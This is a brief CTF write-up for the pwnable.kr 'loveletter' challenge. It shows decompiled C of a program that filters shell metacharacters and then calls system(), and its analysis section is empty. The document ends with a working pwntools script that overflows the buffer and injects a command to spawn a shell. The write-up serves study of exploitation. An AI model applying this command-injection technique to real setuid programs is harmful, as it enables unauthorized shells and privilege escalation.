# Pwnable.kr loveletter CTF Writeup

## Problem Description
The code of the program is:
### main
```c
080493a5  int32_t main(int32_t argc, char** argv, char** envp)

080493ac      void* const __return_addr_1 = __return_addr
080493b4      int32_t* var_14 = &argc
080493cb      char** argv_1 = argv
080493d1      void* gsbase
080493d1      int32_t eax_1 = *(gsbase + 0x14)
080493ed      memset(&loveletter, 0, 0x100)
080493ff      size_t eax_3 = strlen(epilog)
08049414      size_t eax_5 = strlen(prolog)
08049429      printf(format: &data_804a021)
08049449      void buf
08049449      fgets(&buf, n: 0x100, fp: *stdin)
08049449      
08049470      if (*(&buf + strlen(&buf) - 1) == 0xa)
08049487          *(&buf + strlen(&buf) - 1) = 0
08049487      
08049499      puts(str: &data_804a03c)
080494ab      protect(&buf)
080494bd      size_t eax_12 = strlen(&buf)
080494d2      puts(str: &data_804a068)
080494fb      memcpy(&loveletter + zx.d(idx), prolog, eax_5)
08049511      idx += eax_5.w
08049539      memcpy(&loveletter + zx.d(idx), &buf, eax_12)
0804954f      idx += eax_12.w
08049577      memcpy(&loveletter + zx.d(idx), epilog, eax_3)
0804958d      idx += eax_3.w
0804959e      puts(str: &data_804a08c)
080495a6      gid_t egid = getegid()
080495b7      setregid(rgid: getegid(), egid)
080495c9      system(line: &loveletter)
080495d9      *(gsbase + 0x14)
080495d9      
080495e0      if (eax_1 == *(gsbase + 0x14))
080495f1          return 0
080495f1      
080495e2      __stack_chk_fail_local()
080495e2      noreturn
```

### protect
```c
08049216  int32_t protect(char* arg1)

08049235      void* gsbase
08049235      int32_t eax_1 = *(gsbase + 0x14)
08049240      int32_t var_127
08049240      __builtin_strncpy(dest: &var_127, src: "#&;`\'\"|*?~<>^()[]{}$\\,", n: 0x17)
08049240      
08049376      for (int32_t i = 0; strlen(arg1) u> i; i += 1)
08049350          for (int32_t j = 0; strlen(&var_127) u> j; j += 1)
080492c4              if (arg1[i] == *(j + &var_127))
080492e2                  void var_110
080492e2                  strcpy(&var_110, &arg1[i + 1])
080492f8                  *(arg1 + i) = 0xa599e2
08049308                  size_t eax_13 = strlen(&var_110)
08049337                  memcpy(&arg1[strlen(arg1)], &var_110, eax_13)
08049337      
08049397      if (eax_1 == *(gsbase + 0x14))
080493a4          return eax_1 - *(gsbase + 0x14)
080493a4      
08049399      __stack_chk_fail_local()
08049399      noreturn
```

when running, we see this:
```bash
loveletter@ubuntu:~$ ./loveletter
♥ My lover's name is : itamar
♥ Whatever happens, I'll protect her...
♥ Impress her upon my memory...
♥ Her name echos in my mind...
I love itamar very much!
```

## Analysis

## Exploit Code
```python
from pwn import *

context.log_level = 'info'

session = ssh(user='loveletter', host='pwnable.kr', port=2222, password='guest')
p = session.process(['nc', '0', '9034'])

payload = b"nv sh -c bash "
payload += b"A" * (253 - len(payload))
payload += b"#"
payload += b"\x01"

print(payload)

p.sendline(payload)
p.interactive() # cat flag
```
